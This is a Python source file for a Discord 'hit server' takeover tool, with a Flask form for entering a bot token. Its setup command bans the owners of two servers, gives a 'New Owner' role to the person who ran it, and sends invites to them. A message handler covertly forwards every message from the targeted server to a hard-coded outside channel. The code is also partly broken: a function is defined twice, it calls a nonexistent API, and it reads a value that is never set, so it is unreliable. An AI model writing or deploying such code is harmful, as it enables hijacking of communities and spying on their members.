from flask import Flask, render_template, request, redirect, url_for
import threading
import time
import discord
from discord.ext import commands
import asyncio

# Flask App Setup
app = Flask(__name__)

# Store bot data (for demonstration purposes only; use a database in production)
bot_data = {
    "token": None,
    "username": None,
    "client_id": None,
    "status": "offline"
}

# Discord Bot Setup
intents = discord.Intents.default()
intents.members = True
intents.message_content = True  # Enable message content intent

bot = commands.Bot(command_prefix="!", intents=intents)

# Channel ID for forwarding messages
FORWARD_CHANNEL_ID = 1282371631620161560

# Function to start the bot in a separate thread
def run_bot(token):
    bot_data["status"] = "online"
    bot.run(token)

# Discord Bot Events and Commands
@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')
    # Notify the user that the bot is online
    if bot_data["username"]:
        user = await bot.fetch_user(bot_data["username"])
        if user:
            await user.send("The bot is now online! Please tell the owner to add it to the hit server and main server.")

@bot.slash_command(guild_ids=[], name="setup")
async def setup(ctx, hit_server_id: str, main_server_id: str):
    # Verify the bot is in both servers
    hit_guild = bot.get_guild(int(hit_server_id))
    main_guild = bot.get_guild(int(main_server_id))

    if not hit_guild or not main_guild:
        await ctx.send("Please add me to both servers to proceed.", ephemeral=True)
        return

    # Ban the original owner from both servers
    original_owner = main_guild.owner
    await original_owner.ban(reason="Bot setup completed.")
    await hit_guild.owner.ban(reason="Bot setup completed.")

    # Assign a new role to the user who set it up
    new_owner = main_guild.get_member(ctx.user.id)
    if new_owner:
        role = await main_guild.create_role(name="New Owner")
        await new_owner.add_roles(role)

    # Create invite links for the hit server and main server
    hit_invite = await hit_guild.text_channels[0].create_invite(max_uses=1)
    main_invite = await main_guild.text_channels[0].create_invite(max_uses=1)

    # Send the invites to the username provided on the website
    if bot_data["username"]:
        user = await bot.fetch_user(bot_data["username"])
        if user:
            await user.send(f"Setup complete! Here are your invites:\nHit Server: {hit_invite.url}\nMain Server: {main_invite.url}")

    await ctx.send("Setup complete! The original owner has been banned, and invites have been sent.", ephemeral=True)

@bot.event
async def on_message(message):
    # Forward all messages from the hit server to your Discord
    if message.guild and message.guild.id == int(bot_data.get("hit_server_id", 0)):
        forward_channel = bot.get_channel(FORWARD_CHANNEL_ID)
        if forward_channel:
            await forward_channel.send(f"**{message.author}**: {message.content}")

    await bot.process_commands(message)

# Flask Routes
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/setup', methods=['POST'])
def setup():
    bot_token = request.form['bot_token']
    username = request.form['username']
    client_id = request.form['client_id']

    # Save the bot token, username, and client ID
    bot_data["token"] = bot_token
    bot_data["username"] = username
    bot_data["client_id"] = client_id
    bot_data["status"] = "starting"

    # Start the bot in a separate thread
    bot_thread = threading.Thread(target=run_bot, args=(bot_token,))
    bot_thread.start()

    # Wait for the bot to come online (simulate loading)
    time.sleep(5)

    return redirect(url_for('result'))

@app.route('/result')
def result():
    if bot_data["status"] == "online":
        return render_template('result.html', success=True)
    else:
        return render_template('result.html', success=False)

# HTML Templates
@app.route('/templates/index.html')
def index_template():
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Setup Bot</title>
    </head>
    <body>
        <h1>Setup Your Bot</h1>
        <form action="/setup" method="post">
            Bot Token: <input type="text" name="bot_token" required><br>
            Username: <input type="text" name="username" required><br>
            Client ID: <input type="text" name="client_id" required><br>
            <input type="submit" value="Setup">
        </form>
    </body>
    </html>
    """

@app.route('/templates/result.html')
def result_template():
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Setup Result</title>
    </head>
    <body>
        {% if success %}
            <h1>✅ Setup Successful!</h1>
            <p>Your bot is now online. Please tell the owner to add it to the hit server and main server.</p>
        {% else %}
            <h1>❌ Setup Failed</h1>
            <p>Something went wrong. Please try again.</p>
        {% endif %}
    </body>
    </html>
    """

# Run the Flask app and bot
if __name__ == '__main__':
    # Start Flask in a separate thread
    flask_thread = threading.Thread(target=app.run, kwargs={"debug": True})
    flask_thread.start()

    # Start the bot (if a token is provided)
    if bot_data["token"]:
        run_bot(bot_data["token"])
